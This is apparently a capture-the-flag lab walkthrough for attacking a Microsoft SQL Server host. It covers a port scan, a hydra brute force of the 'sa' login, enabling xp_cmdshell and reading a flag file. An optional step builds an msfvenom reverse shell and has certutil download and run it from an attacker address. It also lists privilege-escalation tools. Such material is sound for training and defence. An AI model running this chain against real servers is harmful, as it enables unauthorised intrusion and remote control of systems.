# Scenario 25 — MSSQL xp_cmdshell to Windows RCE

**Difficulty:** 🟡 | **Time:** ~25 min | **Domains:** 02, 06, 13, 14
**Tools:** [nmap](../../tools/nmap.md), [impacket](../../tools/impacket.md), [hydra](../../tools/hydra.md), [msfvenom](../../tools/msfvenom.md)

## Story
Target 10.10.10.25 runs MSSQL. Weak `sa` credentials are suspected. Get a Windows shell and read `C:\flag.txt`.

## Step 1 — Find MSSQL
```bash
nmap -sV -p 1433 10.10.10.25
```
**Expected finding:** `1433/tcp open ms-sql-s Microsoft SQL Server 2019`.

## Step 2 — Brute force sa
```bash
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://10.10.10.25 -f
```
**Expected finding:** `sa:Password123`.
**→ Tool ref:** [hydra mssql](../../tools/hydra.md#mssql)

## Step 3 — Connect with mssqlclient
```bash
mssqlclient.py sa:'Password123'@10.10.10.25 -windows-auth
```
**Expected finding:** `SQL>` prompt.
**→ Tool ref:** [impacket mssqlclient](../../tools/impacket.md#mssqlclient)

## Step 4 — Enable xp_cmdshell
```sql
SQL> enable_xp_cmdshell
-- or manually:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```
**Expected finding:** `Configuration option 'xp_cmdshell' changed from 0 to 1`.

## Step 5 — Execute commands
```sql
xp_cmdshell whoami
xp_cmdshell "type C:\flag.txt"
```
**Expected finding:** Likely `nt service\mssqlserver`. Flag contents printed.

## Step 6 — (Optional) Reverse shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.99 LPORT=4444 -f exe -o /tmp/rev.exe
# host it, then:
SQL> xp_cmdshell "certutil -urlcache -f http://10.10.10.99/rev.exe C:\Windows\Temp\rev.exe && C:\Windows\Temp\rev.exe"
```
**→ Tool ref:** [msfvenom Windows payloads](../../tools/msfvenom.md#windows)

## Step 7 — Final answer
**Answer format:** flag string from `C:\flag.txt`.

## Gotchas across this chain
- If `sa` isn't admin, try `EXECUTE AS LOGIN = 'sa'` after finding a privileged user.
- xp_cmdshell often runs as the MSSQL service account — not necessarily SYSTEM. Use `SeImpersonate` + PrintSpoofer/JuicyPotato for SYSTEM.
- If xp_cmdshell is removed/disabled by policy, use CLR assemblies or OLE Automation procedures.
- `-windows-auth` flag only if the login is a Windows account; for SQL auth, omit it.

## Variant questions this scenario teaches
- "What is the service account running MSSQL?"
- "What database version is installed?"
- "What privilege is required to re-enable xp_cmdshell?" → sysadmin

